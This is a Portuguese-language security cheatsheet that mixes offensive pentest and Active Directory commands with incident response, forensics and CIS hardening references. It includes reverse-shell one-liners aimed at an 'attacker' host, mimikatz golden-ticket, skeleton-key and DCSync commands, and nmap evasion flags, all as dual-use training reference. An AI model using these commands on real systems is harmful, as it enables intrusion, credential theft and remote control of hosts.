<!--
╔══════════════════════════════════════════════════════════════╗
║  Security Cheatsheet                                         ║
╚══════════════════════════════════════════════════════════════╝
-->

# Security Cheatsheet [https://fsxhack.github.io/docs]

---

## Índice

```
 OSINT                    Pentest / Hacking           Active Directory
 Redes / Network          Incident Response           Malware Analysis
 Forense Digital          Linux Investigation         Windows Investigation
 DevSecOps                Docker / K8s Security       AppSec / API Security
 Linux Hardening (CIS)    Windows Hardening (CIS)     AD Hardening (CIS)
 Cloud Hardening (CIS)    Hardening Baselines         ISO 27001:2022
```

---

##  OSINT
`Open Source Intelligence · Reconhecimento passivo · 18 itens`

### Sites & Plataformas `WEB`

```
osintframework.com       → Framework completo de OSINT categorizado
web-check.xyz            → Análise completa de URL: malware, DNS, headers, TLS
shodan.io                → Motor de busca para serviços e dispositivos expostos
censys.io                → Asset discovery, certificados TLS, portas abertas
viz.greynoise.io         → Identifica IPs que fazem scanning massivo
urlscan.io               → Análise completa de URLs com screenshot e DOM
crt.sh                   → Certificate Transparency — subdomínios via TLS certs
ipinfo.io                → ASN, geolocation, abuse contact de IPs
ip-api.com               → Geolocalização e info de IP/domínio (JSON API)
archive.org              → Wayback Machine — histórico de páginas
search4faces.com         → Busca reversa de rostos em redes sociais
instantusername.com      → Usuário em múltiplas plataformas simultaneamente
geofinderai.com          → Geolocalização a partir de foto via IA
themarkup.org/blacklight → Verifica se um site está rastreando você
sightline-maps.vercel.app→ Mapa interativo para OSINT geográfico
earthkit.app             → Análise de metadados e informações de imagens
hackviser.com/tools      → Catálogo completo de ferramentas de segurança
```

### Ferramentas CLI `TOOL`

```bash
# theHarvester
theHarvester -d target.com -b google,bing,linkedin
theHarvester -d target.com -b all -f output.html

# amass — enumeração de subdomínios
amass enum -passive -d target.com
amass enum -active -d target.com -brute

# subfinder + httpx
subfinder -d target.com -silent | httpx -status-code -title
subfinder -d target.com | katana -jc   # JS crawling

# Reconhecimento DNS
whois target.com
dig +short MX target.com
dig target.com ANY @8.8.8.8
nslookup -type=TXT target.com
dnsx -d target.com -a -aaaa -cname -mx -ns -txt

# Shodan CLI
shodan search "org:target port:22 product:OpenSSH"
shodan host 1.2.3.4
shodan stats --facets port "org:target"
```

---

##  Pentest / Hacking
`Recon · Exploração · Pós-exploração · Serviços · 40+ itens`

### Ferramentas Hackviser `TOOLS`

```
nmap           → Port scanner e detecção de serviços — essencial
metasploit     → Framework de exploração — módulos, payloads, meterpreter
CrackMapExec   → Swiss army knife para redes Windows/AD
impacket       → Suite Python para ataques de rede/AD — PSExec, Secretsdump
mimikatz       → Dump de credenciais Windows — LSASS, SAM, DPAPI
Responder      → LLMNR/NBT-NS/mDNS poisoning — captura de hashes NTLMv2
bettercap      → Network attacks — ARP spoof, MITM, sniffing
enum4linux     → Enumeração de info via SMB/RPC em sistemas Windows/Samba
nuclei         → Scanner baseado em templates YAML — CVEs, misconfigs
ffuf           → Fuzzing de diretórios, parâmetros, subdomínios
sqlmap         → SQL Injection automatizado — dump de DB
WPScan         → Scanner específico para WordPress — plugins, temas, CVEs
JoomScan       → Scanner para Joomla CMS
```

### Nmap — Scanning `CMD`

```bash
# Reconhecimento básico
nmap -sn 192.168.1.0/24               # ping sweep
nmap -sV -sC -p- --open target.com    # full port scan + scripts
nmap -sU -p 53,67,68,161 target.com   # UDP

# Scripts NSE
nmap --script=smb-vuln-* -p 445 target.com
nmap --script=http-* -p 80,443 target.com
nmap --script=vuln target.com

# Evasão / stealth
nmap -D RND:10 target.com             # decoys
nmap --data-length 25 -f target.com   # fragmentação
nmap -sI zombie:port target.com       # idle/zombie scan
nmap -T2 --randomize-hosts target.com # timing lento
```

### Escalada de Privilégios Linux `CMD`

```bash
# Enum automático
./linpeas.sh -a                       # PEASS-ng completo
./lse.sh -l2                          # Linux Smart Enum

# SUID/SGID
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null

# Sudo misconfiguration
sudo -l
# GTFOBins: https://gtfobins.github.io

# Cron jobs
cat /etc/crontab; ls /etc/cron.*
# Writable paths em cron?
find /etc/cron* /var/spool/cron -writable 2>/dev/null
```

### Escalada de Privilégios Windows `CMD`

```powershell
# Enum automático
.\winPEAS.exe
.\Seatbelt.exe -group=all

# AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Serviços com binário writable
Get-Acl "C:\Program Files\VulnSvc\svc.exe" | Select -ExpandProperty AccessToString

# Unquoted service path
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v '\"'

# Token impersonation
.\PrintSpoofer.exe -i -c cmd         # SeImpersonatePrivilege
.\GodPotato.exe -cmd "cmd /c whoami"
```

---

##  Active Directory
`Ataques · Enumeração · Kerberos · Lateral Movement · 35+ itens`

### Enumeração `CMD`

```powershell
# PowerView
Get-Domain
Get-DomainUser -Properties samaccountname,memberof,admincount
Get-DomainComputer -Properties name,operatingsystem
Get-DomainGroup -Identity "Domain Admins" | Select -ExpandProperty member
Find-LocalAdminAccess                  # hosts onde usuário é admin local
Get-DomainTrust                        # trust entre domínios

# LDAP
ldapsearch -x -H ldap://DC -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName
```

### Ataques Kerberos `CMD`

```bash
# AS-REP Roasting (não precisa de creds)
GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat
hashcat -m 18200 asrep.txt rockyou.txt

# Kerberoasting
GetUserSPNs.py domain.local/user:pass -request -outputfile tgs.txt
hashcat -m 13100 tgs.txt rockyou.txt

# Pass-the-Ticket
mimikatz # kerberos::ptt ticket.kirbi
Rubeus.exe ptt /ticket:base64==

# Golden Ticket
mimikatz # lsadump::dcsync /domain:domain.local /user:krbtgt
mimikatz # kerberos::golden /user:admin /domain:domain.local /sid:S-1-5-21-... /krbtgt:HASH /ptt

# Silver Ticket
mimikatz # kerberos::golden /user:admin /domain:domain.local /sid:S-1-5-21-... /target:server.domain.local /service:cifs /rc4:HASH /ptt
```

### ACL Abuse & Persistência `CMD`

```powershell
# Verificar ACLs interessantes
Find-InterestingDomainAcl -ResolveGUIDs
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs |
  Where {$_.ActiveDirectoryRights -match "Write"}

# DCSync — verificar replication rights
Get-ObjectAcl -DistinguishedName "DC=domain,DC=local" -ResolveGUIDs |
  Where {($_.ObjectType -match 'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll')}

# Skeleton Key (requer DA)
mimikatz # misc::skeleton     # senha "mimikatz" p/ qualquer user

# AdminSDHolder abuse
Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName user -Rights All
```

### Defesa & Detecção `REF`

```
Protected Users       → Adicionar contas admin — impede NTLM/delegation
LAPS                  → Senhas locais únicas e rotativas por máquina
gMSA                  → Group Managed Service Accounts — senha auto-gerenciada
Tiered Admin Model    → Tier 0/1/2 — separar admin de DC, servidor e workstation
Credential Guard      → Isola LSASS em VM — impede dump de credenciais
PingCastle            → Auditoria de segurança AD — score e relatório
Purple Knight         → Avaliação de vulnerabilidades do AD — Semperis
Event 4769 + threshold→ Alert para Kerberoasting — muitos TGS em pouco tempo
```

---

##  Redes / Network
`Análise · Captura · Diagnóstico · Segurança · 22 itens`

### Captura e Análise `CMD`

```bash
# tcpdump
tcpdump -i eth0 -w capture.pcap
tcpdump -i eth0 'port 80 or port 443' -w http.pcap
tcpdump -i eth0 host 1.2.3.4 -w target.pcap
tcpdump -r capture.pcap -nn
tcpdump -r capture.pcap 'tcp[13] & 2 != 0'  # SYN packets

# Wireshark display filters
http.request.method == "POST"
dns.qry.name contains "evil"
ip.addr == 192.168.1.1 && tcp.port == 4444
tcp.flags.syn == 1 && tcp.flags.ack == 0   # SYN scan
frame contains "password"
tls.handshake.type == 1                     # Client Hello

# tshark CLI
tshark -r capture.pcap -Y 'http' -T fields -e http.host -e http.request.uri
tshark -r capture.pcap -qz io,phs
tshark -i eth0 -Y 'dns' -T fields -e dns.qry.name
```

### Diagnóstico e Ferramentas `CMD`

```bash
ss -tulnp                          # portas em escuta
ss -antp | grep ESTABLISHED        # conexões ativas
netstat -rn                        # tabela de roteamento
iptables -L -n -v --line-numbers   # listar regras
iptables -I INPUT -s 1.2.3.4-j DROP
traceroute -n target.com
mtr --report target.com
arp -a                             # ARP cache

# Netcat reverse shells
nc -lvnp 4444                      # listener
bash -i >& /dev/tcp/attacker/4444 0>&1
nc -e /bin/bash attacker 4444

# Ferramentas
# Wireshark · Zeek · Suricata · Snort · socat · scapy · naabu
```

---

##  Incident Response
`Triagem · Contenção · Erradicação · Recuperação · PICERL · 30 itens`

### Fases IR — PICERL `REF`

```
1. Preparation  → Playbooks, ferramentas prontas, contatos, backups validados
2. Identification→ Triagem de alertas, IOCs, escopo do incidente, classificação
3. Containment  → Isolamento de host/rede, bloqueio de contas, firewall rules
4. Eradication  → Remoção de malware, fechar acesso inicial, patch de vuln
5. Recovery     → Restore de sistemas, validação, monitoramento intensivo
6. Lessons Learned→ Post-mortem, timeline, detecções melhoradas, relatório final
```

### MITRE ATT&CK — Detecção por Fase

| Fase | Técnicas | Event IDs / Detecção |
|------|----------|----------------------|
| Initial Access | Phishing, exploit público | Email gateway, 4625 |
| Execution | PowerShell, WMI, Scripts | Script Block Log, Sysmon |
| Persistence | Run keys, scheduled tasks | Sysmon 13, Event 4698 |
| PrivEsc | Token impersonation, UAC bypass | 4672, 4624 tipo 3 |
| Defense Evasion | AMSI bypass, timestomping | AMSI, behavioral |
| Credential Access | Mimikatz, Kerberoasting | 4625, 4648, 4769 |
| Lateral Movement | PsExec, WMI, RDP, PtH | 4624 tipo 3, 4648 |
| Exfiltration | DNS tunnel, HTTPS, cloud | UEBA, DLP, NetFlow |

### Isolamento de Host `CMD`

```bash
# Linux — isolamento de rede
iptables -I INPUT -j DROP
iptables -I OUTPUT -j DROP
iptables -I INPUT -s IR_TEAM_IP -j ACCEPT   # manter acesso IR

# Windows — isolamento
netsh advfirewall set allprofiles firewallpolicy blockinbound,blockoutbound
# Bloquear tudo exceto IR team
netsh advfirewall firewall add rule name="IR Access" protocol=TCP dir=in remoteip=IR_IP action=allow

# Dump de memória antes de desligar
winpmem_mini.exe memory.dmp      # Windows
avml /tmp/memory.lime            # Linux (via LiME kernel module)
```

### Plataformas IR `WEB`

```
TheHive         → Case management IR — tasks, IOCs, alertas automáticos
MISP            → Threat intel sharing — IOCs, correlação, feeds
Velociraptor    → DFIR em escala — VQL, coleta remota, hunting
IRIS-web        → Plataforma open-source de investigação digital
GRR             → Live forensics remoto (Google) — endpoints em escala
HELK            → Hunting ELK stack — Elasticsearch + Kibana + Kafka
KAPE            → Kroll Artifact Parser and Extractor — triage rápida
```

---

##  Malware Analysis
`Static · Dynamic · Sandboxes · IOCs · 20+ itens`

### Análise Estática `CMD`

```bash
# Identificação básica
file malware.exe
strings -n 6 malware.exe | grep -E "(http|cmd|reg|powershell|CreateRemoteThread)"
exiftool malware.exe
md5sum malware.exe && sha256sum malware.exe
ssdeep malware.exe               # fuzzy hash para variantes

# PE Analysis
pescan malware.exe               # seções, imports, exports
pehash malware.exe               # import hash para famílias
peframe malware.exe              # estrutura PE completa
objdump -d malware.exe | head -200

# Descompactar
upx -d malware.exe               # UPX packer
detect-it-easy malware.exe       # packer fingerprint
```

### Sandboxes Online `WEB`

```
any.run              → Sandbox interativo — sessão ao vivo, MITRE mapping
hybrid-analysis.com  → Análise estática + dinâmica — YARA, IOCs
app.triage.abuse.ch  → Rápido e gratuito — família de malware
virustotal.com       → 70+ engines — hashes, URLs, domínios, IPs
cuckoo              → Self-hosted sandbox — relatório completo
joesandbox.com      → Enterprise — behavioral, network, detections
```

### Ferramentas de Análise `TOOL`

```
YARA            → Escrever regras para detecção de famílias — yara rules.yar sample
yarGen          → Gerar regras YARA de amostras automaticamente
floss           → Extrai strings ofuscadas/encodadas de binários
capa            → Identifica capabilities de malware — MITRE ATT&CK mapping
ghidra          → Reverse engineering — disassembler/decompiler NSA
IDA Pro/Free    → Disassembler gold standard — debugging + static
x64dbg          → Debugger Windows — breakpoints, memory dumps
binwalk         → Análise de firmware — extração de filesystems embutidos
```

---

##  Forense Digital
`Evidências · Memória · Disco · Timeline · 25+ itens`

### Forense de Memória `CMD`

```bash
# Volatility 3
vol -f memory.dmp windows.pslist              # processos
vol -f memory.dmp windows.netscan             # conexões de rede
vol -f memory.dmp windows.malfind            # injeção de código
vol -f memory.dmp windows.cmdline            # linhas de comando
vol -f memory.dmp windows.dlllist --pid 1234
vol -f memory.dmp windows.handles --pid 1234
vol -f memory.dmp windows.dumpfiles --pid 1234
vol -f memory.dmp windows.registry.hivelist  # hives na memória
vol -f memory.dmp windows.hashdump           # hashes de senhas

# Análise de perfil Linux
vol -f memory.dmp linux.bash                 # histórico bash
vol -f memory.dmp linux.netstat
```

### Forense de Disco `CMD`

```bash
# Aquisição (preservar evidência)
dd if=/dev/sda of=disk.img bs=4M status=progress
dcfldd if=/dev/sda of=disk.img hash=sha256 hashlog=hash.txt
ewfacquire /dev/sda                          # formato E01 (FTK/EnCase)

# Montagem somente-leitura
mount -o ro,noexec,nodev /dev/sda1 /mnt/evidence
# ou via loop device
losetup -r -f disk.img

# Análise com Autopsy / The Sleuth Kit
mmls disk.img                               # layout de partição
fls -r -l disk.img -o 2048                 # listagem de arquivos
icat disk.img -o 2048 1234 > file          # extrair por inode
mactime -b /mnt/evidence/ > timeline.txt  # MAC timeline
```

### Timeline & IOCs `CMD`

```bash
# Plaso — log2timeline
log2timeline.py --storage-file evidence.plaso /mnt/evidence
psort.py -o l2tcsv evidence.plaso > timeline.csv

# grep por IOCs em logs
grep -r "1.2.3.4" /var/log/ --include="*.log"
grep -rE "(evil\.com|malware\.exe|cmd\.exe /c)" /mnt/evidence/

# Volatility — IoC scan
vol -f memory.dmp windows.malfind | grep -v "\\\\Windows"
```

---

##  Linux Investigation
`Análise · Logs · Processos · Persistência · 30+ itens`

### Triagem Inicial `CMD`

```bash
# Processos e rede
ps auxf                              # process tree completo
ss -tulnp                            # portas em escuta
lsof -i -n -P                       # todas as conexões abertas
netstat -antp | grep ESTABLISHED

# Arquivos modificados recentemente
find / -mtime -1 -type f 2>/dev/null | grep -v /proc
find /tmp /var/tmp /dev/shm -type f 2>/dev/null
ls -la /tmp/ /var/tmp/ /dev/shm/

# Crontabs e persistência
crontab -l
cat /etc/crontab; ls /etc/cron.*
find / -name "*.service" -newer /etc/passwd 2>/dev/null

# Usuários e logins
last -F                              # histórico de logins
lastb                                # tentativas falhas SSH
cat /etc/passwd | awk -F: '$3==0'   # UIDs root
grep -v "nologin\|false" /etc/passwd # shells válidas

# Arquivos SUID suspeitos
find / -perm -4000 -type f 2>/dev/null | sort
```

### Logs Críticos `CMD`

```bash
tail -f /var/log/auth.log            # autenticação SSH/sudo
journalctl -xe --since "1 hour ago" # systemd journal
ausearch -m avc -ts today            # SELinux denials
grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn
grep "Accepted publickey" /var/log/auth.log   # logins por chave
dmesg | grep -i "oom\|error\|fail"

# Comandos executados recentemente
cat ~/.bash_history
cat /root/.bash_history 2>/dev/null
find /home -name ".bash_history" -exec cat {} \;
```

---

##  Windows Investigation
`Eventos · PowerShell · DFIR · Artefatos · 28+ itens`

### Event IDs Críticos `REF`

| Event ID | Descrição | Severidade |
|----------|-----------|------------|
| `4624` | Logon bem-sucedido (monitorar tipo 3/10) | MEDIUM |
| `4625` | Logon falho — brute force | **HIGH** |
| `4648` | Logon com credenciais explícitas — PtH/PtT | **HIGH** |
| `4672` | Logon com privilégios especiais | **HIGH** |
| `4688` | Processo criado (com linha de comando) | MEDIUM |
| `4698/4702` | Scheduled task criada/modificada | **HIGH** |
| `4720` | Conta de usuário criada | MEDIUM |
| `4732/4728` | Membro adicionado a grupo privilegiado | **HIGH** |
| `4769` | Kerberos TGS request — Kerberoasting | **HIGH** |
| `4776` | NTLM authentication — lateral movement | HIGH |
| `7045` | Novo serviço instalado — malware/backdoor | **HIGH** |
| `1102` | Audit log cleared — tampering | **CRITICAL** |
| `4104` | Script block logging — PowerShell | HIGH |

### PowerShell Forense `CMD`

```powershell
# Event logs
Get-WinEvent -LogName Security -FilterXPath "*[System[EventID=4624]]" | Select -First 20
Get-WinEvent -LogName System | Where-Object {$_.Id -eq 7045}
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" | Where Id -eq 4104

# Processos e rede
Get-Process | Select Name,Id,CPU,Path | Sort CPU -Descending
Get-NetTCPConnection | Where State -eq "Established" | Select LocalPort,RemoteAddress,OwningProcess
(Get-Process -Id (Get-NetTCPConnection -RemotePort 4444).OwningProcess).Path

# Persistência
Get-ScheduledTask | Where State -eq "Ready"
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
Get-ItemProperty "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
Get-Service | Where StartType -eq "Automatic" | Where Status -eq "Running"

# Usuários locais
Get-LocalUser | Select Name,Enabled,LastLogon
Get-LocalGroupMember -Group "Administrators"
```

### Artefatos de Forense Windows `REF`

```
Prefetch              → C:\Windows\Prefetch\*.pf — aplicações executadas
ShimCache (AppCompat) → HKLM\SYSTEM\CurrentControlSet\Control\SessionManager\AppCompatCache
Amcache.hve           → C:\Windows\AppCompat\Programs\Amcache.hve — executáveis
SRUM                  → C:\Windows\System32\sru\SRUDB.dat — network, cpu, memory por processo
LNK files             → C:\Users\*\AppData\Roaming\Microsoft\Windows\Recent\
Jump Lists            → C:\Users\*\AppData\Roaming\Microsoft\Windows\Recent\AutomaticDestinations\
MRU Registry          → HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs
Thumbcache            → C:\Users\*\AppData\Local\Microsoft\Windows\Explorer\thumbcache_*.db
Browser History       → %APPDATA%\...\User Data\Default\History (Chrome/Edge SQLite)
```

---

##  DevSecOps
`CI/CD · SAST · DAST · Container Security · 20+ itens`

### Pipeline de Segurança `REF`

| Fase | Categoria | Ferramenta | Objetivo |
|------|-----------|------------|----------|
| Pre-commit | Secret Scan | gitleaks, detect-secrets | Detectar secrets antes do push |
| Pre-commit | IaC | tfsec, checkov, kics | Misconfigs em Terraform/K8s |
| Build | SAST | Semgrep, SonarQube, Bandit | Vulnerabilidades no código |
| Build | SCA | Snyk, OWASP DC, Trivy | Dependências vulneráveis |
| Build | Container | Trivy, Grype, Syft | CVEs na imagem Docker |
| Test | DAST | OWASP ZAP, nuclei | Scan dinâmico em staging |
| Deploy | Policy | OPA/Rego, Kyverno | Policy as Code em K8s |
| Runtime | Detection | Falco, Tetragon, Cilium | Comportamento anômalo |

### Secrets Management `REF`

```
HashiCorp Vault  → Segredo dinâmico, rotação automática, audit log
AWS Secrets Manager → Integração nativa com IAM, rotação Lambda
Azure Key Vault  → Secrets, keys, certificates — RBAC + logging
SOPS             → Encriptar arquivos de config com KMS/GPG/age
External Secrets → K8s operator — sync de secrets externos para K8s
sealed-secrets   → Secrets encriptados para GitOps — Bitnami
```

---

##  Docker / K8s Security
`Container Hardening · Runtime · RBAC · Network · 22 itens`

### Docker Hardening `CMD`

```bash
# Auditoria CIS Docker
./docker-bench-security.sh

# Run seguro
docker run --rm \
  --read-only \
  --no-new-privileges \
  --cap-drop ALL \
  --cap-add NET_BIND_SERVICE \
  --user 1001:1001 \
  --security-opt no-new-privileges:true \
  --security-opt seccomp=default.json \
  --memory 512m --cpus 0.5 \
  --network custom-net \
  nginx:latest

# Scan de imagem
trivy image nginx:latest
syft nginx:latest          # SBOM
grype nginx:latest         # CVE check
docker history --no-trunc nginx:latest
```

### Kubernetes Security `CMD`

```bash
# CIS Kubernetes Benchmark
kube-bench run --targets master,node,etcd,policies

# RBAC auditoria
kubectl auth can-i --list --as=system:serviceaccount:default:default
kubectl get clusterrolebindings -o json | jq '.items[] | select(.subjects[]?.kind=="ServiceAccount")'
kubectl get rolebindings,clusterrolebindings -A | grep -v "system:"

# Network Policies (verificar se existem)
kubectl get networkpolicy -A
# Pods sem NetworkPolicy (risco)
kubectl get pods -A -o jsonpath='{range .items[*]}{.metadata.namespace}/{.metadata.name}{"\n"}{end}'

# Secrets em texto claro no env
kubectl get pods -A -o jsonpath='{range .items[*]}{.spec.containers[*].env[*]}{"\n"}{end}' | grep -i "pass\|secret\|key\|token"
```

---

##  AppSec / API Security
`OWASP · API Security · Ferramentas · 25+ itens`

### OWASP Top 10 (2021) `REF`

```
A01 Broken Access Control      → Acesso não autorizado a recursos e dados
A02 Cryptographic Failures     → Dados sensíveis expostos por cripto fraca/ausente
A03 Injection (SQL/XSS/etc.)   → Execução de código e comandos não autorizados
A04 Insecure Design            → Ausência de controles de segurança por design
A05 Security Misconfiguration  → Permissões excessivas, defaults inseguros
A06 Vulnerable Components      → Bibliotecas com CVEs conhecidos em uso
A07 Auth & Session Failures    → Comprometimento de identidade e sessões
A08 Software & Data Integrity  → Supply chain, CI/CD sem validação de integridade
A09 Logging & Monitoring Fails → Incidentes sem detecção por ausência de logs
A10 SSRF                       → Forçar servidor a acessar serviços internos/externos
```

### OWASP API Security Top 10 `REF`

```
API1 Broken Object Level Auth  → Acessar objetos de outros usuários (IDOR)
API2 Broken Authentication     → Tokens frágeis, ausência de rate limit em auth
API3 Broken Object Property    → Expor/modificar propriedades não autorizadas
API4 Unrestricted Resource     → Sem limites de tamanho, paginação ou rate limit
API5 Broken Function Level Auth→ Acessar funções admin sem autorização
API6 Unrestricted Access to Biz→ Abusar lógica de negócio sem rate limit
API7 Server Side Request Forgery→ Forçar servidor a fazer requests internos
API8 Security Misconfiguration → CORS permissivo, verbos HTTP desnecessários
API9 Improper Inventory Mgmt   → APIs esquecidas (shadow APIs) sem autenticação
API10 Unsafe Consumption of APIs→ Confiar cegamente em dados de APIs de terceiros
```

### Ferramentas AppSec — Completo `TOOL`

```
DAST / Proxy
────────────────────────────────────────────────────────────────
Burp Suite Pro    → Proxy, scanner ativo, intruder, repeater, collaborator
OWASP ZAP         → DAST gratuito — spider, active scan, API testing, CI mode, HUD
caido             → Proxy HTTP moderno — alternativa ao Burp, replay, extensível
mitmproxy         → Proxy MITM scriptável em Python — interceptar e modificar tráfego
nikto             → Web server scanner — arquivos perigosos, headers ausentes, versões

Fuzzing & Discovery
────────────────────────────────────────────────────────────────
ffuf              → Fast web fuzzer — diretórios, parâmetros, subdomínios, vhosts
feroxbuster       → Content discovery em Rust — recursivo, filtros por status/tamanho
Arjun             → HTTP parameter discovery — GET/POST/JSON/XML, parâmetros ocultos
ParamSpider       → Extrai parâmetros via Wayback Machine — input para fuzzing
katana            → Crawler JS e API — endpoints, formulários, links dinâmicos
hakrawler         → Crawler rápido em Go — JS, formulários, links; output para pipeline

Injection
────────────────────────────────────────────────────────────────
sqlmap            → SQL injection automatizado — detecção, exploração, bypass WAF
ghauri            → SQLi avançado com tamper scripts — alternativa moderna ao sqlmap
dalfox            → XSS scanner avançado — GET/POST, DOM XSS, blind XSS callback, pipe mode
wapiti            → DAST open source — XSS, SQLi, LFI, SSRF, XXE, CRLF, SSTI
ssrfmap           → SSRF exploitation — scan de portas internas, cloud metadata
interactsh        → OOB interaction server — blind XSS, SSRF, XXE callback

GraphQL
────────────────────────────────────────────────────────────────
GraphQL voyager   → Visualiza schema GraphQL — tipos, queries, mutations
graphw00f         → GraphQL engine fingerprinting — Apollo, Hasura, Strawberry

Authentication
────────────────────────────────────────────────────────────────
jwt_tool          → Testa ataques JWT — alg:none, RS256→HS256 confusion, brute force
jwt.io            → Decode, inspecção e edição de tokens JWT

CORS / Headers
────────────────────────────────────────────────────────────────
corscanner        → CORS misconfiguration scanner em massa
CORSy             → CORS tester avançado — wildcard, null origin, subdomain bypass

SAST / SCA
────────────────────────────────────────────────────────────────
Semgrep           → SAST multi-linguagem — regras por padrão, custom rules, CI
SonarQube         → SAST enterprise — code smells, CVEs, quality gates, OWASP rules
Bandit            → SAST Python — hardcoded secrets, eval, pickle, subprocess inseguro
Snyk              → SCA — dependências, containers, IaC, code; fix automático via PR
OWASP DC          → Dependency-Check — SCA para Java, .NET, Python, Node, Go
Retire.js         → Detecta JS libs vulneráveis — CLI, Burp plugin, browser ext

Secrets & Cloud
────────────────────────────────────────────────────────────────
truffleHog        → Detecção de secrets em repos Git — histórico, alta entropia
gitleaks          → Secret scanning — pre-commit hook, CI, SARIF, 150+ detectores
S3Scanner         → Buckets S3/GCS/Azure Blob públicos — scan em massa

CMS Scanners
────────────────────────────────────────────────────────────────
WPScan            → Scanner WordPress — plugins, temas, CVEs, usuários, senhas fracas
CMSeek            → Detecção e enumeração de CMS — 180+ CMSs (Joomla, Drupal, etc.)
whatweb           → Fingerprinting de tecnologias web — CMS, frameworks, versões
nuclei            → CVEs específicos, exposed panels, FUZZ templates, API templates
```

### API Security — Best Practices `REF`

```
API Gateway      → Kong, Apigee, AWS GW — rate limit, auth, logging centralizado
Autenticação     → OAuth 2.0 + PKCE, JWT com rotação, API Keys com escopos
Rate Limiting    → Por IP, por usuário, por endpoint — retornar 429 Too Many Requests
Input validation → Validar schema de entrada — OpenAPI spec como contrato
Output filtering → Nunca retornar campos desnecessários — evitar data exposure
HTTPS only       → TLS 1.2+ — HSTS, redirect de HTTP para HTTPS
Headers segurança→ X-Content-Type-Options, X-Frame-Options, CSP, CORS restritivo
Logging completo → Logar request/response com user_id, IP, timestamp, status code
API inventory    → Manter catálogo de todas as APIs — eliminar shadow APIs
```

---

##  Linux Hardening (CIS)
`CIS Linux Benchmark · Ubuntu/RHEL/Debian · Configuração defensiva · 45 controles`

### 1. Filesystem & Boot `CIS L1`

```bash
# /etc/modprobe.d/disable-fs.conf — filesystems desnecessários
install cramfs /bin/true
install freevxfs /bin/true
install jffs2 /bin/true
install hfs /bin/true
install hfsplus /bin/true
install udf /bin/true
# Verificar
lsmod | grep -E "cramfs|freevxfs|jffs2|hfs|udf"

# /etc/fstab — opções de segurança por partição
/tmp     tmpfs  defaults,rw,nosuid,nodev,noexec  0 0
/var/tmp tmpfs  defaults,rw,nosuid,nodev,noexec  0 0
/home    ext4   defaults,nosuid,nodev             0 1
/dev/shm tmpfs  defaults,rw,nosuid,nodev,noexec  0 0
# Verificar montagem atual
mount | grep -E "nosuid|nodev|noexec"

# GRUB hardening
grub2-mkpasswd-pbkdf2               # gerar hash
chmod og-rwx /boot/grub2/grub.cfg
chown root:root /boot/grub2/grub.cfg
```

### 2. Network Hardening — sysctl `CIS L1`

```bash
# /etc/sysctl.d/99-cis-hardening.conf
# IPv4
net.ipv4.ip_forward = 0
net.ipv4.conf.all.send_redirects = 0
net.ipv4.conf.default.send_redirects = 0
net.ipv4.conf.all.accept_source_route = 0
net.ipv4.conf.all.accept_redirects = 0
net.ipv4.conf.all.secure_redirects = 0
net.ipv4.conf.all.log_martians = 1
net.ipv4.conf.default.log_martians = 1
net.ipv4.icmp_echo_ignore_broadcasts = 1
net.ipv4.icmp_ignore_bogus_error_responses = 1
net.ipv4.conf.all.rp_filter = 1
net.ipv4.tcp_syncookies = 1
# IPv6 (desabilitar se não usado)
net.ipv6.conf.all.disable_ipv6 = 1
net.ipv6.conf.default.disable_ipv6 = 1
# Aplicar
sysctl -p /etc/sysctl.d/99-cis-hardening.conf
```

### 3. Logging & Auditd `CIS L2`

```bash
# /etc/audit/rules.d/99-cis.rules
# Mudanças de data/hora
-a always,exit -F arch=b64 -S adjtimex -S settimeofday -k time-change
-w /etc/localtime -p wa -k time-change
# Usuários e grupos
-w /etc/group  -p wa -k identity
-w /etc/passwd -p wa -k identity
-w /etc/shadow -p wa -k identity
-w /etc/sudoers -p wa -k identity
# Acesso negado a arquivos
-a always,exit -F arch=b64 -S creat -S open -S openat -S truncate -F exit=-EACCES -k access
-a always,exit -F arch=b64 -S creat -S open -S openat -S truncate -F exit=-EPERM  -k access
# Comandos privilegiados
-a always,exit -F path=/usr/bin/sudo -F perm=x -F auid>=1000 -F auid!=-1 -k privileged
-a always,exit -F path=/usr/bin/su   -F perm=x -F auid>=1000 -F auid!=-1 -k privileged
# Network connections
-a always,exit -F arch=b64 -S socket -F a0=2 -k network_connect
# Tornar regras imutáveis (requer reboot para alterar)
-e 2
```

### 4. Acesso & Autenticação `CIS L1`

| Controle | Parâmetro | Arquivo |
|----------|-----------|---------|
| PAM senha | `minlen=14, ucredit=-1, lcredit=-1, dcredit=-1, ocredit=-1, remember=5` | `/etc/security/pwquality.conf` |
| PAM lockout | `deny=5, unlock_time=900, fail_interval=900` | `/etc/pam.d/system-auth` |
| Shadow expiration | `PASS_MAX_DAYS=90, PASS_MIN_DAYS=1, PASS_WARN_AGE=7` | `/etc/login.defs` |
| sudo | `NOPASSWD proibido, timeout=15min, logfile=/var/log/sudo.log, requiretty` | `/etc/sudoers` |
| SSH | `PermitRootLogin no, PasswordAuthentication no, MaxAuthTries 4, X11Forwarding no, AllowTcpForwarding no` | `/etc/ssh/sshd_config` |
| umask | `umask 027` | `/etc/profile`, `/etc/bashrc` |
| Contas inativas | `useradd -D -f 30` | sistema |
| Cron | criar `/etc/cron.allow`, remover `/etc/cron.deny` | sistema |

### 5. Serviços & Permissões `CIS L1`

```bash
# Desabilitar serviços desnecessários
for svc in xinetd inetd avahi-daemon cups nfs rpcbind rsync nis bluetooth talk; do
  systemctl disable --now $svc 2>/dev/null
done

# Permissões de arquivos críticos
chmod 644 /etc/passwd /etc/group
chmod 640 /etc/shadow /etc/gshadow
chmod 600 /etc/ssh/sshd_config
chmod 700 /root
chmod 1777 /tmp /var/tmp
